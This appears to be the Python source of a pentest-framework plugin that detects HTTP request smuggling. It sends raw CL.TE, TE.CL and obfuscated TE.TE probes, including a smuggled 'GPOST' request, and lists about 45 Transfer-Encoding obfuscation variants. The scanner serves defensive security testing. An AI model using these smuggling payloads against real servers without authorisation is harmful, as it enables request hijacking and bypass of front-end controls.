"""HTTP request smuggling detection — CL.TE, TE.CL, TE.TE, H2.CL.

Uses raw TCP sockets (via basilisk.utils.raw_http) to send malformed
Transfer-Encoding / Content-Length headers that aiohttp would normalize.
Timing confirmation: smuggled probe causes next request to timeout.
"""

from __future__ import annotations

import logging
import time
from typing import ClassVar
from urllib.parse import urlparse

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# TE obfuscation variants for TE.TE detection
TE_OBFUSCATIONS: list[str] = [
    # Typo/prefix variations
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding: chunkedx",
    # Spacing around colon
    "Transfer-Encoding : chunked",
    "Transfer-Encoding :chunked",
    "Transfer-Encoding:chunked",
    # Dual TE headers (different values)
    "Transfer-Encoding: chunked\r\nTransfer-encoding: cow",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
    "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
    # Tab/whitespace in value
    "Transfer-Encoding:\tchunked",
    "Transfer-Encoding: \tchunked",
    "Transfer-Encoding:\t chunked",
    "Transfer-Encoding: chunked\t",
    "Transfer-Encoding: chunked ",
    " Transfer-Encoding: chunked",
    # Case variations of header name
    "Transfer-Encoding: CHUNKED",
    "Transfer-Encoding: Chunked",
    "transfer-encoding: chunked",
    "Transfer-encoding: chunked",
    "transfer-ENCODING: chunked",
    "TRANSFER-ENCODING: chunked",
    "tRaNsFeR-eNcOdInG: chunked",
    # Extension/parameter in value
    "Transfer-Encoding: chunked;ext=val",
    "Transfer-Encoding: chunked; q=1.0",
    # Multiline/continuation (obs-fold)
    "Transfer-Encoding:\n chunked",
    "Transfer-Encoding:\r\n chunked",
    "Transfer-Encoding:\r\n\tchunked",
    "Transfer-Encoding: chunked\r\n\tmore",
    # Line prefix injection
    "X: X\r\nTransfer-Encoding: chunked",
    "Foo: bar\r\nTransfer-Encoding: chunked",
    # Combined with Content-Encoding
    "Content-Encoding: chunked\r\nTransfer-Encoding: chunked",
    # Identity + chunked combinations
    "Transfer-Encoding: identity, chunked",
    "Transfer-Encoding: chunked, identity",
    "Transfer-Encoding: identity\r\nTransfer-encoding: chunked",
    # Vertical tab/form feed separators
    "Transfer-Encoding:\x0bchunked",
    "Transfer-Encoding:\x0cchunked",
    # Null byte in value
    "Transfer-Encoding: chunked\x00",
    "Transfer-Encoding: chunk\x00ed",
    # Double Transfer-Encoding with tab
    "Transfer-Encoding:\tchunked\r\nTransfer-Encoding: identity",
    # Unusual whitespace
    "Transfer-Encoding:  chunked",
    "Transfer-Encoding: \x0bchunked",
    # CR without LF
    "Transfer-Encoding: chunked\rX: X",
    # Underscore variant (HTTP/2 pseudo-header mapping)
    "Transfer_Encoding: chunked",
    # Mixed case value with valid prefix
    "Transfer-Encoding: CHunKeD",
]


class HttpSmugglingPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="http_smuggling",
        display_name="HTTP Request Smuggling",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects HTTP request smuggling (CL.TE, TE.CL, TE.TE) using raw "
            "TCP sockets with timing confirmation. 45+ TE obfuscation variants."
        ),
        produces=["smuggling_results"],
        timeout=90.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        from basilisk.utils.raw_http import RawHttpClient

        findings: list[Finding] = []
        data: dict = {"tests": [], "vulnerable": False}

        from basilisk.utils.http_check import resolve_base_url

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data=data,
            )

        parsed = urlparse(base_url)
        use_tls = parsed.scheme == "https"
        port = parsed.port or (443 if use_tls else 80)
        hostname = parsed.hostname or target.host

        raw = RawHttpClient(connect_timeout=8.0, read_timeout=10.0)

        # Test 1: CL.TE — server uses Content-Length, backend uses Transfer-Encoding
        if not ctx.should_stop:
            result = await self._test_cl_te(raw, hostname, port, use_tls)
            data["tests"].append(result)
            if result.get("vulnerable"):
                data["vulnerable"] = True
                findings.append(Finding.critical(
                    "HTTP Smuggling: CL.TE confirmed",
                    description=(
                        "Server prioritizes Content-Length while backend uses "
                        "Transfer-Encoding. Attacker can smuggle requests."
                    ),
                    evidence=result.get("evidence", ""),
                    remediation=(
                        "Configure front-end and back-end to agree on "
                        "Transfer-Encoding handling. Reject ambiguous requests."
                    ),
                    confidence=result.get("confidence", 0.8),
                    verified=True,
                    tags=["pentesting", "smuggling", "cl-te"],
                ))

        # Test 2: TE.CL — server uses Transfer-Encoding, backend uses Content-Length
        if not ctx.should_stop:
            result = await self._test_te_cl(raw, hostname, port, use_tls)
            data["tests"].append(result)
            if result.get("vulnerable"):
                data["vulnerable"] = True
                findings.append(Finding.critical(
                    "HTTP Smuggling: TE.CL confirmed",
                    description=(
                        "Server prioritizes Transfer-Encoding while backend uses "
                        "Content-Length. Attacker can smuggle requests."
                    ),
                    evidence=result.get("evidence", ""),
                    remediation=(
                        "Normalize Transfer-Encoding handling across all layers."
                    ),
                    confidence=result.get("confidence", 0.8),
                    verified=True,
                    tags=["pentesting", "smuggling", "te-cl"],
                ))

        # Test 3: TE.TE — both use TE but handle obfuscation differently
        if not ctx.should_stop:
            for i, te_variant in enumerate(TE_OBFUSCATIONS[:10]):
                if ctx.should_stop:
                    break
                result = await self._test_te_te(
                    raw, hostname, port, use_tls, te_variant,
                )
                data["tests"].append(result)
                if result.get("vulnerable"):
                    data["vulnerable"] = True
                    findings.append(Finding.high(
                        f"HTTP Smuggling: TE.TE obfuscation variant #{i + 1}",
                        description=(
                            f"Transfer-Encoding obfuscation bypasses normalization. "
                            f"Variant: {te_variant[:60]}"
                        ),
                        evidence=result.get("evidence", ""),
                        remediation="Reject requests with ambiguous Transfer-Encoding.",
                        confidence=result.get("confidence", 0.6),
                        tags=["pentesting", "smuggling", "te-te"],
                    ))
                    break  # One TE.TE finding is enough

        if not findings:
            findings.append(Finding.info(
                "No HTTP smuggling detected",
                tags=["pentesting", "smuggling"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data=data,
        )

    async def _test_cl_te(
        self, raw, host: str, port: int, use_tls: bool,
    ) -> dict:
        """CL.TE: Send CL that covers only part; TE chunked ends early."""
        probe = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 13\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"SMUGGLED"
        )
        return await self._timing_test(raw, host, port, use_tls, probe, "CL.TE")

    async def _test_te_cl(
        self, raw, host: str, port: int, use_tls: bool,
    ) -> dict:
        """TE.CL: Send chunked body with CL shorter than actual content."""
        probe = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"8\r\n"
            f"SMUGGLED\r\n"
            f"0\r\n"
            f"\r\n"
        )
        return await self._timing_test(raw, host, port, use_tls, probe, "TE.CL")

    async def _test_te_te(
        self, raw, host: str, port: int, use_tls: bool, te_header: str,
    ) -> dict:
        """TE.TE: Obfuscated Transfer-Encoding to confuse one layer."""
        probe = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"{te_header}\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        )
        return await self._timing_test(
            raw, host, port, use_tls, probe, f"TE.TE ({te_header[:30]})",
        )

    async def _timing_test(
        self, raw, host: str, port: int, use_tls: bool,
        probe: str, technique: str,
    ) -> dict:
        """Send probe then a normal request; timeout on 2nd = confirmed."""
        result: dict = {
            "technique": technique,
            "vulnerable": False,
            "evidence": "",
            "confidence": 0.0,
        }
        try:
            # Send the smuggling probe
            resp1 = await raw.send_raw(
                host, port, probe.encode(), use_tls=use_tls,
            )
            if not resp1:
                return result

            # Send a normal follow-up request immediately
            normal = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )
            start = time.monotonic()
            resp2 = await raw.send_raw(
                host, port, normal.encode(), use_tls=use_tls,
            )
            elapsed = time.monotonic() - start

            # If follow-up times out or gets unexpected response, likely vulnerable
            if resp2 is None and elapsed >= 8.0:
                result["vulnerable"] = True
                result["confidence"] = 0.8
                result["evidence"] = (
                    f"Technique: {technique}\n"
                    f"Follow-up request timed out ({elapsed:.1f}s)\n"
                    f"Probe response status: {self._extract_status(resp1)}"
                )
            elif resp2 and self._extract_status(resp2) in (400, 403, 405):
                # Different status than expected might indicate partial smuggling
                result["evidence"] = (
                    f"Technique: {technique}\n"
                    f"Follow-up status: {self._extract_status(resp2)}\n"
                    f"Elapsed: {elapsed:.1f}s"
                )
        except Exception as e:
            logger.debug("http_smuggling: %s", e)
        return result

    @staticmethod
    def _extract_status(response: bytes) -> int:
        """Extract HTTP status code from raw response."""
        try:
            first_line = response.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
            parts = first_line.split(" ", 2)
            if len(parts) >= 2:
                return int(parts[1])
        except (ValueError, IndexError):
            pass
        return 0
